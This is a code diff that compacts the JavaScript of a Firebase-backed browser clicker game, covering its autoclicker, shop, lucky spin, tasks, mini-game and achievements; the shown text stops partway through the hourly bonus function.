+      tempBoostTimeout = setTimeout(() => { clickPower = originalClickPower; showMessage("Boost ended"); updateClickPowerBar(); updateProfilePanel(); submitScore(); tempBoostTimeout = null; tempBoostEndTime = 0; }, duration);
     }
 
-    function autoclickTick() {
-      if (!user) {
-        stopAutoclicker();
-        return;
-      }
-      clickToken();
-    }
+    function autoclickTick() { if (!user) { stopAutoclicker(); return; } clickToken(); }
 
     function startAutoclicker(duration, extendTime = false) {
-      if (autoclickInterval) {
-        clearInterval(autoclickInterval);
-        autoclickInterval = null;
-      }
-
+      if (autoclickInterval) { clearInterval(autoclickInterval); autoclickInterval = null; }
       if (autoclickActive) {
-        const remainingTime = Math.max(0, autoclickEndTime - Date.now());
-        if (remainingTime <= 0) {
-          stopAutoclicker();
-          autoclickActive = true;
-          autoclickEndTime = Date.now() + duration;
-          autoclickInterval = setInterval(autoclickTick, 1000);
-          setTimeout(() => stopAutoclicker(), duration);
-        } else if (extendTime) {
-          autoclickEndTime = Date.now() + remainingTime + duration;
-          autoclickInterval = setInterval(autoclickTick, 1000);
-          setTimeout(() => stopAutoclicker(), remainingTime + duration);
-        } else {
-          autoclickEndTime = Date.now() + duration;
-          autoclickInterval = setInterval(autoclickTick, 1000);
-          setTimeout(() => stopAutoclicker(), duration);
-        }
-      } else {
-        autoclickActive = true;
-        autoclickEndTime = Date.now() + duration;
-        autoclickInterval = setInterval(autoclickTick, 1000);
-        setTimeout(() => stopAutoclicker(), duration);
-      }
-
-      autoclickerUses++;
-      updateTaskProgress("autoclickerMaster", 1);
-      updateProfilePanel();
-      submitScore();
-
-      if (user) {
-        db.ref("leaderboard/" + user.uid).update({
-          autoclickActive: true,
-          autoclickEndTime: autoclickEndTime,
-          lastUpdate: Date.now()
-        }).catch(() => {});
-      }
+        const rem = Math.max(0, autoclickEndTime - Date.now());
+        if (rem <= 0) stopAutoclicker();
+        autoclickEndTime = extendTime ? Date.now() + rem + duration : Date.now() + duration;
+      } else { autoclickActive = true; autoclickEndTime = Date.now() + duration; }
+      autoclickInterval = setInterval(autoclickTick, 1000);
+      setTimeout(() => stopAutoclicker(), autoclickEndTime - Date.now());
+      autoclickerUses++; updateTaskProgress("autoclickerMaster", 1); updateProfilePanel(); submitScore();
+      if (user) db.ref("leaderboard/" + user.uid).update({ autoclickActive: true, autoclickEndTime, lastUpdate: Date.now() }).catch(() => {});
     }
 
     function stopAutoclicker() {
-      if (autoclickInterval) {
-        clearInterval(autoclickInterval);
-        autoclickInterval = null;
-      }
-      autoclickActive = false;
-      autoclickEndTime = 0;
-      autoclickCooldown = false;
-      updateProfilePanel();
-      submitScore();
-
-      if (user) {
-        db.ref("leaderboard/" + user.uid).update({
-          autoclickActive: false,
-          autoclickEndTime: 0,
-          lastUpdate: Date.now()
-        }).catch(() => {});
-      }
+      if (autoclickInterval) { clearInterval(autoclickInterval); autoclickInterval = null; }
+      autoclickActive = false; autoclickEndTime = 0; autoclickCooldown = false; updateProfilePanel(); submitScore();
+      if (user) db.ref("leaderboard/" + user.uid).update({ autoclickActive: false, autoclickEndTime: 0, lastUpdate: Date.now() }).catch(() => {});
     }
 
-    function activateFreeAutoclicker() {
-      if (autoclickActive) {
-        showMessage("Autoclicker is already active!");
-        return;
-      }
-      const duration = getAutoclickerDuration();
-      startAutoclicker(duration);
-      updateAutoclickerShop();
-    }
+    function activateFreeAutoclicker() { if (autoclickActive) showMessage("Already active!"); else { startAutoclicker(getAutoclickerDuration()); updateAutoclickerShop(); } }
 
-    // Shop functions
+    // ==================== SHOP ====================
     function buyUpgrade(type) {
       if (type === "clickPower") {
-        if (clickPower >= 8) {
-          showMessage("Click Power is at maximum!");
-          return;
-        }
-
+        if (clickPower >= 8) { showMessage("Max level!"); return; }
         const cost = getClickPowerUpgradeCost();
-        db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
-          const newScore = (currentScore || 0) - cost;
-          if (newScore < 0) return undefined;
-          return newScore;
-        }).then(transactionResult => {
-          if (transactionResult.committed) {
-            score = transactionResult.snapshot.val();
-            clickPower++;
-            updateCounterDisplay();
-            updateClickPowerBar();
-            updateProfilePanel();
-            updateClickPowerCostText();
-            submitScore();
-            showMessage("Click Power upgraded!");
-          } else {
-            showMessage("Not enough tokens for upgrade.");
-          }
+        db.ref(`leaderboard/${user.uid}/score`).transaction(cs => { const ns = (cs || 0) - cost; return ns < 0 ? undefined : ns; }).then(tr => {
+          if (tr.committed) { score = tr.snapshot.val(); clickPower++; updateCounterDisplay(); updateClickPowerBar(); updateProfilePanel(); updateClickPowerCostText(); submitScore(); showMessage("Click Power upgraded!"); }
+          else showMessage("Not enough tokens.");
         });
       }
     }
 
     function upgradeAutoclicker() {
-      if (autoclickerLevel >= 20) {
-        showMessage("Autoclicker is at maximum level!");
-        return;
-      }
-
+      if (autoclickerLevel >= 20) { showMessage("Max level!"); return; }
       const cost = getAutoclickerUpgradeCost();
-      if (score < cost.tokens || crystals < cost.crystals) {
-        showMessage("Not enough tokens or crystals to upgrade!");
-        return;
-      }
-
-      db.ref(`leaderboard/${user.uid}`).transaction(data => {
-        if ((data.score || 0) >= cost.tokens && (data.crystals || 0) >= cost.crystals) {
-          return {
-            ...data,
-            score: (data.score || 0) - cost.tokens,
-            crystals: (data.crystals || 0) - cost.crystals,
-            autoclickerLevel: (data.autoclickerLevel || 1) + 1
-          };
-        }
+      if (score < cost.tokens || crystals < cost.crystals) { showMessage("Not enough resources!"); return; }
+      db.ref(`leaderboard/${user.uid}`).transaction(d => {
+        if ((d.score || 0) >= cost.tokens && (d.crystals || 0) >= cost.crystals) return { ...d, score: d.score - cost.tokens, crystals: d.crystals - cost.crystals, autoclickerLevel: (d.autoclickerLevel || 1) + 1 };
         return undefined;
-      }).then(transactionResult => {
-        if (transactionResult.committed) {
-          score = transactionResult.snapshot.val().score;
-          crystals = transactionResult.snapshot.val().crystals;
-          autoclickerLevel = transactionResult.snapshot.val().autoclickerLevel || autoclickerLevel + 1;
-          showMessage(`Autoclicker upgraded to level ${autoclickerLevel}!`);
-          updateCounterDisplay();
-          updateProfilePanel();
-          updateAutoclickerShop();
-          submitScore();
-        } else {
-          showMessage("Not enough tokens or crystals to upgrade!");
-        }
+      }).then(tr => {
+        if (tr.committed) { score = tr.snapshot.val().score; crystals = tr.snapshot.val().crystals; autoclickerLevel = tr.snapshot.val().autoclickerLevel || autoclickerLevel + 1; showMessage(`Autoclicker Lv${autoclickerLevel}!`); updateCounterDisplay(); updateProfilePanel(); updateAutoclickerShop(); submitScore(); }
+        else showMessage("Not enough resources.");
       });
     }
 
-    function buyLuckySpin(tokenCost = 300, crystalCost = 10) {
-      if (!user) {
-        showMessage("Please sign in to use Lucky Spin.");
-        return;
-      }
-
-      db.ref(`luckySpin/${user.uid}`).once("value").then(snapshot => {
-        const spinData = snapshot.val() || { spinsToday: 0, lastSpinDate: "" };
-        const today = new Date().toDateString();
-        let spinsToday = spinData.lastSpinDate === today ? spinData.spinsToday : 0;
-
-        if (spinsToday >= 3) {
-          showMessage("Daily Lucky Spin limit reached! Try again tomorrow.");
-          return;
-        }
-
-        if (score < tokenCost || crystals < crystalCost) {
-          showMessage("Not enough tokens or crystals!");
-          return;
-        }
-
-        db.ref(`leaderboard/${user.uid}`).transaction(data => {
-          if ((data.score || 0) >= tokenCost && (data.crystals || 0) >= crystalCost) {
-            return {
-              ...data,
-              score: (data.score || 0) - tokenCost,
-              crystals: (data.crystals || 0) - crystalCost
-            };
-          }
-          return undefined;
-        }).then(result => {
-          if (result.committed) {
-            score = result.snapshot.val().score;
-            crystals = result.snapshot.val().crystals;
-
-            db.ref(`luckySpin/${user.uid}`).update({
-              spinsToday: spinsToday + 1,
-              lastSpinDate: today
-            });
-
+    function buyLuckySpin(tc = 300, cc = 10) {
+      if (!user) return showMessage("Sign in first.");
+      db.ref(`luckySpin/${user.uid}`).once("value").then(s => {
+        const sd = s.val() || { spinsToday: 0, lastSpinDate: "" }, today = new Date().toDateString();
+        let st = sd.lastSpinDate === today ? sd.spinsToday : 0;
+        if (st >= 3) return showMessage("Daily limit reached!");
+        if (score < tc || crystals < cc) return showMessage("Not enough resources!");
+        db.ref(`leaderboard/${user.uid}`).transaction(d => ((d.score||0)>=tc && (d.crystals||0)>=cc) ? {...d, score:d.score-tc, crystals:d.crystals-cc} : undefined).then(r => {
+          if (r.committed) {
+            score = r.snapshot.val().score; crystals = r.snapshot.val().crystals;
+            db.ref(`luckySpin/${user.uid}`).update({ spinsToday: st+1, lastSpinDate: today });
             const rand = Math.random();
-            if (rand < 0.4) {
-              const tokens = Math.floor(500 + Math.random() * 1500);
-              score += tokens;
-              showMessage(`Lucky Spin: +${tokens} tokens!`);
-            } else if (rand < 0.7) {
-              const crystalReward = Math.floor(10 + Math.random() * 20);
-              crystals += crystalReward;
-              showMessage(`Lucky Spin: +${crystalReward} 💎!`);
-            } else if (rand < 0.85) {
-              boostClickPowerTemporarily(clickPower, 300000);
-              showMessage("Lucky Spin: x2 Click Multiplier for 5 minutes!");
-            } else {
-              startAutoclicker(600000, true);
-              showMessage("Lucky Spin: +10 minutes Autoclicker!");
-            }
-
-            updateCounterDisplay();
-            updateProfilePanel();
-            submitScore();
+            if (rand < 0.4) { const t = Math.floor(500 + Math.random()*1500); score += t; showMessage(`+${t} tokens!`); }
+            else if (rand < 0.7) { const cr = Math.floor(10 + Math.random()*20); crystals += cr; showMessage(`+${cr} 💎!`); }
+            else if (rand < 0.85) boostClickPowerTemporarily(clickPower, 300000);
+            else startAutoclicker(600000, true);
+            updateCounterDisplay(); updateProfilePanel(); submitScore();
           }
         });
       });
     }
 
-    function buySuperAutoclicker(multiplier, duration, tokenCost, crystalCost) {
-      if (superAutoclicker.active && Date.now() < superAutoclicker.endTime) {
-        showMessage("Super Autoclicker is already active!");
-        return;
-      }
-      if (!user) {
-        showMessage("Please sign in first.");
-        return;
-      }
-      if (score < tokenCost || crystals < crystalCost) {
-        showMessage("Not enough tokens or crystals!");
-        return;
-      }
-
-      db.ref(`leaderboard/${user.uid}`).transaction(data => {
-        if ((data.score || 0) >= tokenCost && (data.crystals || 0) >= crystalCost) {
-          return {
-            ...data,
-            score: (data.score || 0) - tokenCost,
-            crystals: (data.crystals || 0) - crystalCost,
-            superAutoclicker: { active: true, multiplier: multiplier, endTime: Date.now() + duration }
-          };
+    function buySuperAutoclicker(mult, dur, tc, cc) {
+      if (superAutoclicker.active && Date.now() < superAutoclicker.endTime) return showMessage("Already active!");
+      if (!user) return showMessage("Sign in first.");
+      if (score < tc || crystals < cc) return showMessage("Not enough resources!");
+      db.ref(`leaderboard/${user.uid}`).transaction(d => ((d.score||0)>=tc && (d.crystals||0)>=cc) ? {...d, score:d.score-tc, crystals:d.crystals-cc, superAutoclicker:{active:true, multiplier:mult, endTime:Date.now()+dur}} : undefined).then(r => {
+        if (r.committed) {
+          score = r.snapshot.val().score; crystals = r.snapshot.val().crystals; superAutoclicker = { active: true, multiplier: mult, endTime: Date.now() + dur };
+          if (superAutoclickInterval) clearInterval(superAutoclickInterval);
+          superAutoclickInterval = setInterval(() => { if (!user) { clearInterval(superAutoclickInterval); superAutoclickInterval = null; superAutoclicker = { active: false, multiplier: 1, endTime: 0 }; return; } score += clickPower * mult; updateCounterDisplay(); updateTaskProgress("collectTokens", clickPower*mult); submitScore(); }, 1000);
+          setTimeout(() => { if (superAutoclickInterval) { clearInterval(superAutoclickInterval); superAutoclickInterval = null; } superAutoclicker = { active: false, multiplier: 1, endTime: 0 }; if (user) db.ref(`leaderboard/${user.uid}`).update({ superAutoclicker }); showMessage("Super Autoclicker ended!"); }, dur);
+          showMessage(`Super Autoclicker x${mult} activated!`); updateCounterDisplay(); updateProfilePanel(); submitScore();
         }
-        return undefined;
-      }).then(result => {
-        if (result.committed) {
-          score = result.snapshot.val().score;
-          crystals = result.snapshot.val().crystals;
-          superAutoclicker = { active: true, multiplier: multiplier, endTime: Date.now() + duration };
-          
-          if (superAutoclickInterval) {
-            clearInterval(superAutoclickInterval);
-          }
-          
-          superAutoclickInterval = setInterval(() => {
-            if (!user) {
-              clearInterval(superAutoclickInterval);
-              superAutoclickInterval = null;
-              superAutoclicker = { active: false, multiplier: 1, endTime: 0 };
-              return;
-            }
-            const points = clickPower * multiplier;
-            score += points;
-            updateCounterDisplay();
-            updateTaskProgress("collectTokens", points);
-            submitScore();
-          }, 1000);
-          
-          setTimeout(() => {
-            if (superAutoclickInterval) {
-              clearInterval(superAutoclickInterval);
-              superAutoclickInterval = null;
-            }
-            superAutoclicker = { active: false, multiplier: 1, endTime: 0 };
-            if (user) {
-              db.ref(`leaderboard/${user.uid}`).update({ superAutoclicker: superAutoclicker });
-            }
-            showMessage("Super Autoclicker ended!");
-          }, duration);
-          
-          updateCounterDisplay();
-          updateProfilePanel();
-          submitScore();
-          showMessage(`Super Autoclicker x${multiplier} activated for ${duration / 60000} minutes!`);
-        } else {
-          showMessage("Not enough tokens or crystals!");
-        }
-      }).catch(error => {
-        console.error("Error buying super autoclicker:", error);
-        showMessage("Failed to purchase Super Autoclicker.");
       });
     }
 
-    // Tasks functions
+    // ==================== TASKS ====================
     function renderTasks() {
-      if (isRenderingTasks) return;
-      isRenderingTasks = true;
-
-      const list = document.getElementById("tasksList");
-      if (!list) {
-        isRenderingTasks = false;
-        return;
-      }
-      
+      if (isRenderingTasks) return; isRenderingTasks = true;
+      const list = document.getElementById("tasksList"); if (!list) { isRenderingTasks = false; return; }
       list.innerHTML = "Loading...";
-
-      if (!user) {
-        list.innerHTML = "Please sign in to view tasks.";
-        isRenderingTasks = false;
-        return;
-      }
-
-      db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
-        const tasksData = snapshot.val() || {};
-        const today = new Date().toDateString();
-        const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();
-        const weekNumber = getWeekNumber();
-        const isEvenWeek = weekNumber % 2 === 0;
-
-        const activeTasks = dailyTasks.filter(task => {
-          if (!task.alternate) return true;
-          if (task.id === "autoclickerMaster" && isEvenWeek) return true;
-          if (task.id === "collectBigTokens" && !isEvenWeek) return true;
-          return false;
-        });
-
+      if (!user) { list.innerHTML = "Sign in to view."; isRenderingTasks = false; return; }
+      db.ref(`tasks/${user.uid}`).once("value").then(s => {
+        const td = s.val() || {}, today = new Date().toDateString(), sow = new Date(new Date().setDate(new Date().getDate()-new Date().getDay()+(new Date().getDay()===0?-6:1))).toDateString(), wn = getWeekNumber(), ew = wn % 2 === 0;
+        const at = dailyTasks.filter(t => { if (!t.alternate) return true; if (t.id==="autoclickerMaster"&&ew) return true; if (t.id==="collectBigTokens"&&!ew) return true; return false; });
         list.innerHTML = "";
-
-        activeTasks.forEach(task => {
-          let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };
-          const resetKey = task.period === "weekly" ? startOfWeek : today;
-          
-          if (taskData.lastReset !== resetKey) {
-            taskData = { 
-              progress: 0, 
-              lastReset: resetKey, 
-              completions: 0, 
-              completed: false,
-              ...(task.goalOptions && {
-                goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
-                reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
-              })
-            };
-            db.ref(`tasks/${user.uid}/${task.id}`).set(taskData).catch(() => {});
-          }
-
+        at.forEach(task => {
+          let tdd = td[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };
+          const rk = task.period === "weekly" ? sow : today;
+          if (tdd.lastReset !== rk) { tdd = { progress: 0, lastReset: rk, completions: 0, completed: false, ...(task.goalOptions && { goal: task.goalOptions[Math.floor(Math.random()*task.goalOptions.length)], reward: task.rewards[Math.floor(Math.random()*task.rewards.length)] }) }; db.ref(`tasks/${user.uid}/${task.id}`).set(tdd).catch(()=>{}); }
           const div = document.createElement("div");
-          
-          if (taskData.completed || taskData.completions >= 1) {
-            div.innerHTML = `<span style="color: #00ffa6;">✅ ${task.description} - Completed!</span>`;
-          } else {
-            const goal = taskData.goal || task.goal;
-            const progress = taskData.progress || 0;
-            const reward = taskData.reward || task.reward;
-            const rewardText = task.rewardType === "crystals" ? `${reward} 💎` : `${reward} tokens`;
-            const canClaim = progress >= goal;
-            
-            if (task.id === "subscribeTwitter") {
-              div.innerHTML = `
-                ${task.description}<br>
-                <a href="${task.link}" target="_blank" style="color: #00ffa6;">Go to X</a>
-                <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="padding: 5px 15px; font-size: 12px; margin-left: 10px;">Claim</button>
-              `;
-            } else if (task.id === "miniGameChallenge" || task.id === "onlineTime") {
-              div.innerHTML = `
-                ${task.description}: ${progress}/${goal}<br>
-                <small>Reward: ${rewardText}</small>
-              `;
-            } else {
-              div.innerHTML = `
-                ${task.description}: ${progress}/${goal} (Reward: ${rewardText})<br>
-                <button class="click-button" onclick="claimTask('${task.id}')" 
-                  ${!canClaim ? 'disabled' : ''}
-                  style="padding: 5px 15px; font-size: 12px;">
-                  ${canClaim ? 'Claim' : 'In Progress'}
-                </button>
-              `;
-            }
+          if (tdd.completed || tdd.completions >= 1) div.innerHTML = `<span style="color:#00ffa6;">✅ ${task.description} - Done!</span>`;
+          else {
+            const g = tdd.goal || task.goal, p = tdd.progress || 0, rw = tdd.reward || task.reward, rt = task.rewardType === "crystals" ? `${rw} 💎` : `${rw} tokens`, cc = p >= g;
+            if (task.id === "subscribeTwitter") div.innerHTML = `${task.description}<br><a href="${task.link}" target="_blank" style="color:#00ffa6;">Go to X</a><button class="click-button" onclick="completeTwitterTask('${task.id}')" style="padding:5px 15px;font-size:12px;margin-left:10px;">Claim</button>`;
+            else if (task.id === "miniGameChallenge" || task.id === "onlineTime") div.innerHTML = `${task.description}: ${p}/${g}<br><small>Reward: ${rt}</small>`;
+            else div.innerHTML = `${task.description}: ${p}/${g} (${rt})<br><button class="click-button" onclick="claimTask('${task.id}')" ${!cc?'disabled':''} style="padding:5px 15px;font-size:12px;">${cc?'Claim':'In Progress'}</button>`;
           }
-          
           list.appendChild(div);
         });
-
         isRenderingTasks = false;
-      }).catch(error => {
-        console.error("Error rendering tasks:", error);
-        list.innerHTML = "Failed to load tasks.";
-        isRenderingTasks = false;
-      });
+      }).catch(() => { list.innerHTML = "Error."; isRenderingTasks = false; });
     }
 
-    function updateTaskProgress(taskId, increment) {
+    function updateTaskProgress(taskId, inc) {
       if (!user) return;
-
-      const task = dailyTasks.find(t => t.id === taskId);
-      if (!task) return;
-      
-      if (task.alternate) {
-        const weekNumber = getWeekNumber();
-        const isEvenWeek = weekNumber % 2 === 0;
-        if (task.id === "autoclickerMaster" && !isEvenWeek) return;
-        if (task.id === "collectBigTokens" && isEvenWeek) return;
-      }
-
-      const now = new Date();
-      const today = now.toDateString();
-      const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
-      const resetKey = task.period === "weekly" ? startOfWeek : today;
-
-      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
-        let taskData = snapshot.val() || { progress: 0, lastReset: resetKey, completions: 0, completed: false };
-
-        if (taskData.lastReset !== resetKey) {
-          taskData = {
-            progress: 0,
-            lastReset: resetKey,
-            completions: 0,
-            completed: false,
-            ...(task.goalOptions && {
-              goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
-              reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
-            })
-          };
-        }
-
-        if (taskData.completed || taskData.completions >= 1) return;
-
-        const newProgress = Math.min((taskData.progress || 0) + increment, taskData.goal || task.goal);
-        
-        if (newProgress !== taskData.progress) {
-          taskData.progress = newProgress;
-          db.ref(`tasks/${user.uid}/${taskId}`).set(taskData).catch(() => {});
-        }
-      }).catch(() => {});
+      const task = dailyTasks.find(t => t.id === taskId); if (!task) return;
+      if (task.alternate) { const wn = getWeekNumber(), ew = wn % 2 === 0; if (task.id==="autoclickerMaster"&&!ew) return; if (task.id==="collectBigTokens"&&ew) return; }
+      const now = new Date(), today = now.toDateString(), sow = new Date(now.setDate(now.getDate()-now.getDay()+(now.getDay()===0?-6:1))).toDateString(), rk = task.period === "weekly" ? sow : today;
+      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(s => {
+        let td = s.val() || { progress: 0, lastReset: rk, completions: 0, completed: false };
+        if (td.lastReset !== rk) td = { progress: 0, lastReset: rk, completions: 0, completed: false, ...(task.goalOptions && { goal: task.goalOptions[Math.floor(Math.random()*task.goalOptions.length)], reward: task.rewards[Math.floor(Math.random()*task.rewards.length)] }) };
+        if (td.completed || td.completions >= 1) return;
+        const np = Math.min((td.progress||0) + inc, td.goal || task.goal);
+        if (np !== td.progress) { td.progress = np; db.ref(`tasks/${user.uid}/${taskId}`).set(td).catch(()=>{}); }
+      }).catch(()=>{});
     }
 
     function claimTask(taskId) {
-      if (!user) {
-        showMessage("Please sign in to complete tasks.");
-        return;
-      }
-
-      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
-        const taskData = snapshot.val();
-        const task = dailyTasks.find(t => t.id === taskId);
-
-        if (!task || !taskData) {
-          showMessage("Task not found!");
-          return;
-        }
-
-        if (taskData.completed || (taskData.completions || 0) >= 1) {
-          showMessage("Task already completed!");
-          return;
-        }
-
-        const goal = taskData.goal || task.goal;
-        
-        if ((taskData.progress || 0) >= goal) {
-          const completions = (taskData.completions || 0) + 1;
-          const reward = taskData.reward || task.reward;
-          
-          if (task.rewardType === "crystals") {
-            crystals = (crystals || 0) + reward;
-            showMessage(`✅ +${reward} 💎 for completing: ${task.description}`);
-          } else if (task.id === "autoclickerMaster") {
-            startAutoclicker(300000, true);
-            showMessage(`✅ Free 5-minute autoclicker for: ${task.description}`);
-          } else {
-            score += reward;
-            showMessage(`✅ +${reward} tokens for completing: ${task.description}`);
-          }
-          
-          db.ref(`tasks/${user.uid}/${task.id}`).set({
-            ...taskData,
-            completions: completions,
-            completed: true
-          }).then(() => {
-            updateCounterDisplay();
-            updateProfilePanel();
-            submitScore();
-            renderTasks();
-          }).catch(() => {
-            showMessage("Failed to save task progress.");
-          });
-        } else {
-          showMessage(`Progress: ${taskData.progress}/${goal}. Keep going!`);
-        }
-      }).catch(() => {
-        showMessage("Failed to fetch task data.");
+      if (!user) return showMessage("Sign in.");
+      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(s => {
+        const td = s.val(), task = dailyTasks.find(t => t.id === taskId);
+        if (!task || !td) return; if (td.completed || (td.completions||0) >= 1) return showMessage("Already done!");
+        const g = td.goal || task.goal;
+        if ((td.progress||0) >= g) {
+          const comp = (td.completions||0) + 1, rw = td.reward || task.reward;
+          if (task.rewardType === "crystals") { crystals += rw; showMessage(`✅ +${rw} 💎`); }
+          else if (task.id === "autoclickerMaster") { startAutoclicker(300000, true); showMessage("✅ Free 5-min autoclicker!"); }
+          else { score += rw; showMessage(`✅ +${rw} tokens!`); }
+          db.ref(`tasks/${user.uid}/${task.id}`).set({...td, completions: comp, completed: true}).then(() => { updateCounterDisplay(); updateProfilePanel(); submitScore(); renderTasks(); });
+        } else showMessage(`${td.progress}/${g}`);
       });
     }
 
     function completeTwitterTask(taskId) {
-      if (!user) {
-        showMessage("Please sign in to complete tasks.");
-        return;
-      }
-
-      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
-        const taskData = snapshot.val() || {};
-        const task = dailyTasks.find(t => t.id === taskId);
-
-        if (!task) {
-          showMessage("Task not found!");
-          return;
-        }
-
-        if (taskData.completed || (taskData.completions || 0) >= 1) {
-          showMessage("Task already completed for today!");
-          return;
-        }
-
-        const completions = (taskData.completions || 0) + 1;
-        
-        db.ref(`tasks/${user.uid}/${taskId}`).set({
-          progress: task.goal,
-          lastReset: taskData.lastReset || new Date().toDateString(),
-          completions: completions,
-          completed: true
-        }).then(() => {
-          score += task.reward;
-          showMessage(`✅ +${task.reward} tokens for following on X!`);
-          updateCounterDisplay();
-          submitScore();
-          renderTasks();
-        }).catch(() => {
-          showMessage("Failed to complete task.");
-        });
-      }).catch(() => {
-        showMessage("Failed to fetch task data.");
+      if (!user) return showMessage("Sign in.");
+      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(s => {
+        const td = s.val() || {}, task = dailyTasks.find(t => t.id === taskId);
+        if (!task) return; if (td.completed || (td.completions||0) >= 1) return showMessage("Already done!");
+        db.ref(`tasks/${user.uid}/${taskId}`).set({ progress: task.goal, lastReset: td.lastReset||new Date().toDateString(), completions: (td.completions||0)+1, completed: true }).then(() => { score += task.reward; showMessage(`✅ +${task.reward} tokens!`); updateCounterDisplay(); submitScore(); renderTasks(); });
       });
     }
 
-    // Mini-game
-    function startMiniGame() {
-      if (score < 1000) {
-        showMessage("You need 1000 tokens to start the mini-game!");
-        return;
-      }
-      miniGameActive = true;
-      miniGameClicks = 0;
-      document.getElementById("miniGamePanel").style.display = "block";
-      document.getElementById("miniGameClicks").innerText = miniGameClicks;
-      let timeLeft = 10;
-      document.getElementById("miniGameTimer").innerText = timeLeft;
-      miniGameTimer = setInterval(() => {
-        timeLeft--;
-        document.getElementById("miniGameTimer").innerText = timeLeft;
-        if (timeLeft <= 0) endMiniGame();
-      }, 1000);
-    }
+    // ==================== MINI-GAME ====================
+    function startMiniGame() { if (score < 1000) return showMessage("Need 1000 tokens!"); miniGameActive = true; miniGameClicks = 0; document.getElementById("miniGamePanel").style.display = "block"; document.getElementById("miniGameClicks").innerText = 0; let tl = 10; document.getElementById("miniGameTimer").innerText = tl; miniGameTimer = setInterval(() => { tl--; document.getElementById("miniGameTimer").innerText = tl; if (tl <= 0) endMiniGame(); }, 1000); }
+    function miniGameClick() { if (miniGameActive) { miniGameClicks++; document.getElementById("miniGameClicks").innerText = miniGameClicks; if (miniGameClicks >= 50) endMiniGame(true); } }
+    function endMiniGame(success = false) { clearInterval(miniGameTimer); miniGameActive = false; document.getElementById("miniGamePanel").style.display = "none"; if (success) { score += 500; showMessage("+500 tokens!"); updateTaskProgress("miniGameChallenge", 1); submitScore(); } else showMessage("Failed!"); updateCounterDisplay(); updateProfilePanel(); }
 
-    function miniGameClick() {
-      if (miniGameActive) {
-        miniGameClicks++;
-        document.getElementById("miniGameClicks").innerText = miniGameClicks;
-        if (miniGameClicks >= 50) endMiniGame(true);
-      }
-    }
-
-    function endMiniGame(success = false) {
-      clearInterval(miniGameTimer);
-      miniGameActive = false;
-      document.getElementById("miniGamePanel").style.display = "none";
-      if (success) {
-        score += 500;
-        showMessage("Mini-game completed! +500 tokens!");
-        updateTaskProgress("miniGameChallenge", 1);
-        submitScore();
-      } else {
-        showMessage("Mini-game failed. Try again!");
-      }
-      updateCounterDisplay();
-      updateProfilePanel();
-    }
-
-    // Achievements
+    // ==================== ACHIEVEMENTS ====================
     function checkAchievements() {
-      if (!achievements.superClicker && totalClicks >= 10000) {
-        achievements.superClicker = true;
-        boostClickPowerTemporarily(2, 120000);
-        showMessage("Secret Achievement Unlocked: Super Clicker!");
-        saveAchievements();
-      }
-
-      if (!achievements.tokenHoarder && score >= 1000000) {
-        achievements.tokenHoarder = true;
-        boostClickPowerTemporarily(2, 120000);
-        showMessage("Secret Achievement Unlocked: Token Hoarder!");
-        saveAchievements();
-      }
-
-      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
-      if (!achievements.level5 && currentLevel >= 5) {
-        achievements.level5 = true;
-        boostClickPowerTemporarily(2, 120000);
-        showMessage("Secret Achievement Unlocked: Level 5 Reached!");
-        saveAchievements();
-      }
+      if (!achievements.superClicker && totalClicks >= 10000) { achievements.superClicker = true; boostClickPowerTemporarily(2, 120000); showMessage("Achievement: Super Clicker!"); saveAchievements(); }
+      if (!achievements.tokenHoarder && score >= 1000000) { achievements.tokenHoarder = true; boostClickPowerTemporarily(2, 120000); showMessage("Achievement: Token Hoarder!"); saveAchievements(); }
+      if (!achievements.level5 && parseInt(document.getElementById("playerLevel").innerText) >= 5) { achievements.level5 = true; boostClickPowerTemporarily(2, 120000); showMessage("Achievement: Level 5!"); saveAchievements(); }
     }
-
-    function saveAchievements() {
-      if (!user) return;
-      db.ref("achievements/" + user.uid).set(achievements);
-    }
-
+    function saveAchievements() { if (user) db.ref("achievements/" + user.uid).set(achievements); }
     function renderAchievements() {
-      const list = document.getElementById('achievementsList');
-      list.innerHTML = '';
-
-      for (const key in allAchievements) {
-        const achieved = achievements[key];
-        const ach = allAchievements[key];
-
-        const div = document.createElement('div');
-        div.style.marginBottom = '10px';
-        div.style.padding = '8px';
-        div.style.border = '1px solid #00c3ff';
-        div.style.borderRadius = '8px';
-        div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
-        div.style.color = achieved ? '#000' : '#fff';
-        div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
-        list.appendChild(div);
-      }
+      const list = document.getElementById('achievementsList'); list.innerHTML = '';
+      for (const k in allAchievements) { const a = achievements[k], ac = allAchievements[k]; const d = document.createElement('div'); d.style.cssText = 'margin-bottom:10px;padding:8px;border:1px solid #00c3ff;border-radius:8px;'; d.style.backgroundColor = a ? '#00ffa6' : '#222'; d.style.color = a ? '#000' : '#fff'; d.innerHTML = `<strong>${ac.name}</strong><br>${ac.description}<br><em>${ac.reward}</em>`; list.appendChild(d); }
     }
 
-    // Bonus
+    // ==================== BONUS ====================
     function startBonusTimer() {
       if (bonusTimerInterval) clearInterval(bonusTimerInterval);
-
       bonusTimerInterval = setInterval(() => {
         if (!user) return;
-        db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
-          const data = snapshot.val() || { lastClaim: 0 };
-          const now = Date.now();
-          const timeSinceLastClaim = now - data.lastClaim;
-          const oneHour = 3600000;
